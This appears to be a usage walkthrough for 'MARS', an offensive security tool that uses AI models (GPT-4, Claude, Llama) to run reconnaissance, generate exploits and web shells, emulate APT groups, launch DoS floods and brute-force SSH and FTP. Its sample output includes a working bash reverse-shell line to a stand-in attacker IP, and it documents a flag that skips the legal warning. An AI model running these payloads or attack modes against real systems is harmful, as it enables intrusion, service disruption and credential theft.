# ♂️ MARS - Usage Walkthrough

## Installation

### Step 1: Clone and Install

```bash
cd /home/j0j0m0j0/MilkyWay_Galaxy_Project/MARS
pip3 install -r requirements.txt
```

### Step 2: (Optional) Setup AI Model

**Option A: OpenAI GPT-4**
```bash
pip install openai
# Add your API key in settings or:
export OPENAI_API_KEY="sk-your-key-here"
```

**Option B: Anthropic Claude**
```bash
pip install anthropic
export ANTHROPIC_API_KEY="your-key-here"
```

**Option C: Ollama (Free, Local)**
```bash
# Install Ollama from https://ollama.ai
pip install ollama
ollama pull llama3
```

**Option D: Demo Mode (No API needed)**
Just run MARS without configuring any AI - it works in demo mode!

---

## Running MARS

### Interactive Mode
```bash
python3 mars.py
```

### Command-Line Mode
```bash
# Reconnaissance
python3 mars.py --mode recon --target example.com

# Chat mode
python3 mars.py --mode chat

# MITRE ATT&CK emulation
python3 mars.py --mode mitre --apt APT29 --target corporate.local

# Generate report
python3 mars.py --mode report --format html
```

---

## Example Session

### 1. Startup Banner

```
      #####                    ****                     #####
      #######                 ******                   ######
  ####   ##########           ******             ##########  ###
 #####           #######       ****        ########         #####
 #####                #####             #####               #####
   #####################  #   #####     # ######################
                      ###   #########   ###
               #######    ############      ######
             ##########   #############    #########
           ###########    #############    ###########
         ######       ##  ############# ##         ######
       #####        #####  ###########  ####         #####
     ****#        *******#  #########   #******         #****
   ****         **+++***     ######      ***+++***        ****
 ***          *++++*+  ***  *+++++++*  *** ++++++**          ***
**           *+++++    *+++  ++++++++   +++*    ++++++*          **
          +++++       +=+    +=====+    +=+      +++++*
        ++++         +=+     +=====+     +=+        ++++*
      ++==          +=+      +=====+      +=+          ==++
    ++=            ===       =----=        ===            ==+
                   ==        =----=         ==              =++
                  ==         =----=          ==
                 ==          =-::-=           ==
                 =            =::=             =
                =             =::=              =
               -              =..=               -
              :               :.:                 :
                              :::
                              :::
                              ---
                              |||

       .   .
     .'     '.
    /   o     \
   |     o     |
    \    _    /
     '.     .'
       '...'

      o
     /|\\
     / \\

███╗   ███╗ █████╗ ██████╗ ███████╗
████╗ ████║██╔══██╗██╔══██╗██╔════╝
██╔████╔██║███████║██████╔╝███████╗
██║╚██╔╝██║██╔══██║██╔══██╗╚════██║
██║ ╚═╝ ██║██║  ██║██║  ██║███████║
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
```
made by J0J0M0J0
Think Like a Hacker. Attack Like an AI.
```

### 2. Legal Warning

```
╭─────────────────── ⚠️  LEGAL DISCLAIMER ───────────────────╮
│                                                             │
│ ⚠️  LEGAL WARNING ⚠️                                        │
│                                                             │
│ MARS is for AUTHORIZED SECURITY TESTING ONLY.              │
│                                                             │
│ This AI-powered tool can perform automated penetration     │
│ testing. Unauthorized use is ILLEGAL and UNETHICAL.        │
│                                                             │
│ Type 'I AGREE' to continue (or 'exit' to quit):            │
╰─────────────────────────────────────────────────────────────╯

I AGREE
```

### 3. Main Menu

```
♂️ MARS - Main Menu

[1] 🔍 Reconnaissance
    └── AI-powered target analysis and OSINT

[2] 🎯 Vulnerability Scan
    └── Intelligent vulnerability discovery

[3] 💀 Exploit Generation
    └── AI-generated custom payloads

[4] 🎭 MITRE ATT&CK Emulation
    └── Simulate APT groups (Lazarus, APT29, etc.)

[5] 💬 AI Chat Mode
    └── Natural language red teaming

[6] 📊 Generate Report
    └── AI-written penetration test reports

[7] ⚙️  Settings
    └── Configure AI models and preferences

[0] 🚪 Exit

Select option:
```

---

## Module Walkthroughs

### 🔍 Reconnaissance Mode

```
Select option: 1

🔍 AI Reconnaissance Mode

Enter target domain/IP: example.com

🤖 Initiating AI reconnaissance on: example.com

[cyan]Resolving DNS...        ✓
[cyan]Scanning ports...       ✓
[cyan]Detecting technologies... ✓
[cyan]Enumerating subdomains... ✓

═══════════════════════════════════════
       RECONNAISSANCE RESULTS
═══════════════════════════════════════

Target: example.com
IP: 93.184.216.34

         Open Ports
┏━━━━━━┳━━━━━━━━━━━┓
┃ Port ┃ Service   ┃
┡━━━━━━╇━━━━━━━━━━━┩
│ 80   │ HTTP      │
│ 443  │ HTTPS     │
└──────┴───────────┘

Detected Technologies:
  • Server: ECS (dcb/7F84)
  • ⚠️ Missing security headers: X-Frame-Options, CSP

🤖 AI Analysis:

Based on my analysis of example.com:

1. **Attack Surface Assessment**
   - Web server on ports 80/443
   - No additional services exposed
   
2. **Potential Vulnerabilities**
   - Missing security headers could enable clickjacking
   - Further testing recommended for web app vulnerabilities

3. **Recommended Next Steps**
   - Directory bruteforce on web server
   - Test for SQL injection and XSS
```

---

### 🎯 Vulnerability Scan

```
Select option: 2

🎯 AI Vulnerability Scanner

Enter target URL/IP: https://example.com

🤖 Scanning for vulnerabilities: https://example.com

[cyan]Checking SSL/TLS...        ✓
[cyan]Analyzing security headers... ✓
[cyan]Testing common vulnerabilities... ✓

═══════════════════════════════════════
       VULNERABILITY SCAN RESULTS
═══════════════════════════════════════

    Discovered Vulnerabilities
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Severity ┃ Description                       ┃
┡━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ MEDIUM   │ Missing X-Frame-Options           │
│ MEDIUM   │ Missing Content-Security-Policy   │
│ LOW      │ Missing X-XSS-Protection          │
└──────────┴───────────────────────────────────┘

Total: 3 issues found

🤖 AI Recommendations:

[Analysis of findings with exploitation guidance...]
```

---

### 💀 Exploit Generation

```
Select option: 3

💀 AI Exploit Generator

⚠️  For authorized testing only!

   Available Payload Types
┏━━━┳━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ # ┃ Type            ┃ Description                    ┃
┡━━━╇━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ 1 │ Reverse Shell   │ Multi-language reverse shells  │
│ 2 │ Web Shell       │ PHP/ASP/JSP web shells         │
│ 3 │ SQL Injection   │ SQLi payload generator         │
│ 4 │ XSS Payloads    │ Cross-site scripting payloads  │
│ 5 │ Custom          │ AI-generated custom payload    │
└───┴─────────────────┴────────────────────────────────┘

Select payload type: 1

Attacker IP: 10.10.10.10
Port: 4444

╭──────────────────── Generated Payload ────────────────────╮
│                                                           │
│ 💀 Reverse Shell Payloads                                 │
│ Target: 10.10.10.10:4444                                  │
│                                                           │
│ ━━━ Bash ━━━                                              │
│ bash -i >& /dev/tcp/10.10.10.10/4444 0>&1                │
│                                                           │
│ ━━━ Python ━━━                                            │
│ python3 -c 'import socket,subprocess,os;...'             │
│                                                           │
│ [More payloads...]                                        │
│                                                           │
│ ⚠️  For authorized testing only!                          │
╰───────────────────────────────────────────────────────────╯
```

---

### 🎭 MITRE ATT&CK Emulation

```
Select option: 4

🎭 MITRE ATT&CK Emulation

   Available Adversary Profiles
┏━━━┳━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ # ┃ APT Group           ┃ Origin       ┃ Specialty                  ┃
┡━━━╇━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ 1 │ APT29 (Cozy Bear)   │ Russia       │ Espionage, Government      │
│ 2 │ Lazarus Group       │ North Korea  │ Financial, Cryptocurrency  │
│ 3 │ APT41               │ China        │ Espionage, Gaming          │
│ 4 │ FIN7                │ Russia       │ Financial, POS systems     │
│ 5 │ Custom Profile      │ —            │ Create your own TTPs       │
└───┴─────────────────────┴──────────────┴────────────────────────────┘

Select adversary profile: 1
Enter target: corporate.local

🎭 Emulating: APT29 (Cozy Bear)
Origin: Russia
Russian state-sponsored group focused on espionage

🎯 Attack Campaign: corporate.local
├── Initial Access
│   └── T1566.001 - Spearphishing Attachment
├── Execution
│   └── T1059.001 - PowerShell
├── Persistence
│   └── T1547.001 - Registry Run Keys
├── Defense Evasion
│   └── T1027 - Obfuscated Files
├── Credential Access
│   └── T1003.001 - LSASS Memory
├── Lateral Movement
│   └── T1021.002 - SMB/Windows Admin Shares
└── Exfiltration
    └── T1041 - Exfiltration Over C2

🤖 AI-Generated Execution Plan:

[Detailed attack plan with commands, tools, and evasion tips...]
```

---

### 💬 AI Chat Mode
[... content preserved ...]

---

## 🔥 Monster Mode (Aggressive)

> [!WARNING]
> These modes are **NOISY** and **AGGRESSIVE**. They can crash servers and lock accounts. Use only on systems you are authorized to stress test.

### 🔥 [8] Network Stress Test (DoS)
Simulates high-traffic load to test system resilience.
- **Modes**: TCP, UDP, HTTP Flood
- **Usage**: Select target, port, and intensity (threads).

### 🔓 [9] Brute Force Attack
Multi-protocol credential cracking.
- **Targets**: SSH, FTP, Telnet
- **Method**: Dictionary attack using optimized wordlists.

### ☢️  [66] ORBITAL STRIKE
**The Ultimate Weapon.**
Automatically runs the entire red team chain in sequence:
1.  **Reconnaissance** (Finds the target)
2.  **Vulnerability Scan** (Finds the holes)
3.  **Stress Test** (Smashes the gates)
4.  **Report** (Logs the destruction)

---

## Command Reference

```bash
# Interactive mode
python3 mars.py

# Skip legal warning
python3 mars.py --no-warning

# Reconnaissance
python3 mars.py --mode recon --target example.com

# Vulnerability scan
python3 mars.py --mode vuln --target https://example.com

# Chat mode
python3 mars.py --mode chat

# MITRE emulation
python3 mars.py --mode mitre --apt APT29 --target corporate.local

# Generate report
python3 mars.py --mode report --format html
python3 mars.py --mode report --format json
python3 mars.py --mode report --format markdown
```

---

**made by J0J0M0J0**
**AI-Powered. Ethically Designed. Devastatingly Effective.**
